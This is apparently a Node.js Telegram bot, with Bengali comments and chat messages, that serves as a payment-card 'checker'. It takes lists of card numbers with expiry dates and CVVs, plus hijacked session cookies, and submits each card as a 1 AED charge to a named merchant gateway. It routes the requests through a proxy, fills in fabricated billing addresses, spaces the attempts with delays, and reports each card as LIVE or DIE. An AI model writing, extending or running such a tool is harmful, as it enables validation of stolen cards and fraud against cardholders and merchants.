const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

const token = process.env.TELEGRAM_TOKEN;
const bot = new TelegramBot(token, { polling: true });

let targetWebsite = "https://portal.meydanfz.ae"; 
let activeCookies = "";
const proxyUrl = "http://YOUR_BRIGHT_DATA_PROXY"; // এখানে আপনার আসল প্রক্সি লিঙ্ক দিন
const agent = new HttpsProxyAgent(proxyUrl);

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

function getAddress(cardNumber) {
    const firstDigit = cardNumber.charAt(0);
    if (firstDigit === '3' || firstDigit === '5') {
        return { line1: "725 5th Ave", city: "New York", state: "NY", postal_code: "10022", country: "US" };
    } else {
        return { line1: "Hamdan Bin Mohammed Street", city: "Abu Dhabi", state: "Abu Dhabi", postal_code: "00000", country: "AE" };
    }
}

// /start কমান্ডের জন্য
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, "সালাম রিয়াদ ভাই! বোট এখন পুরোপুরি প্রস্তুত। প্রথমে গেটওয়ে লিঙ্ক, তারপর কুকিজ এবং শেষে কার্ড দিন।");
});

// সব মেসেজ হ্যান্ডলার (অন্য সব মেসেজ রিসিভ মেসেজ ডিলিট করে শুধু এটিই রাখুন)
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!text || text === '/start') return;

    // ১. মার্চেন্ট ওয়েবসাইট সেট করা
    if (text.startsWith('http')) {
        targetWebsite = text;
        return bot.sendMessage(chatId, `🌐 গেটওয়ে সেট করা হয়েছে:\n<code>${targetWebsite}</code>`, { parse_mode: 'HTML' });
    } 

    // ২. কুকিজ সেট করা ({ বা [ দুইভাবেই কাজ করবে এখন)
    if (text.startsWith('[') || text.startsWith('{')) {
        try {
            let cookies = JSON.parse(text);
            if (!Array.isArray(cookies)) cookies = [cookies]; // যদি একটা অবজেক্ট হয় তবে অ্যারে বানিয়ে নেবে
            activeCookies = cookies.map(c => `${c.name}=${c.value}`).join('; ');
            return bot.sendMessage(chatId, "✅ <b>Anti-Die Cookies</b> সেট হয়েছে।", { parse_mode: 'HTML' });
        } catch (e) { return bot.sendMessage(chatId, "❌ ভুল JSON ফরম্যাট! ব্রাউজার থেকে সঠিক কুকিজ দিন।"); }
    }

    // ৩. কার্ড চেকিং
    if (text.includes('|')) {
        if (!activeCookies) return bot.sendMessage(chatId, "⚠️ আগে কুকিজ পাঠান!");

        const cards = text.split('\n');
        bot.sendMessage(chatId, `🛡️ ${cards.length}টি কার্ড চেক শুরু হচ্ছে...`);

        for (let card of cards) {
            const [cc, mm, yy, cvv] = card.split('|').map(c => c.trim());
            const billing = getAddress(cc);

            try {
                const response = await axios.post(targetWebsite, {
                    card_number: cc, exp_month: mm, exp_year: yy, cvv: cvv,
                    address: billing.line1, city: billing.city, state: billing.state, 
                    zip: billing.postal_code, country: billing.country,
                    amount: "1.00", currency: "AED"
                }, {
                    headers: { 'Cookie': activeCookies, 'User-Agent': 'Mozilla/5.0' },
                    httpsAgent: agent,
                    timeout: 25000
                });

                bot.sendMessage(chatId, `🟢 <b>LIVE</b> | <code>${card}</code>\n<b>[GATE]:</b> MeydanFZ\n<b>[MSG]:</b> Approved ✅`, { parse_mode: 'HTML' });

            } catch (error) {
                const errorMsg = error.response?.data?.message || error.message;
                bot.sendMessage(chatId, `🔴 <b>DIE</b> | <code>${card}</code>\n<b>[MSG]:</b> ${errorMsg}`, { parse_mode: 'HTML' });
            }
            await delay(10000); 
        }
    }
});
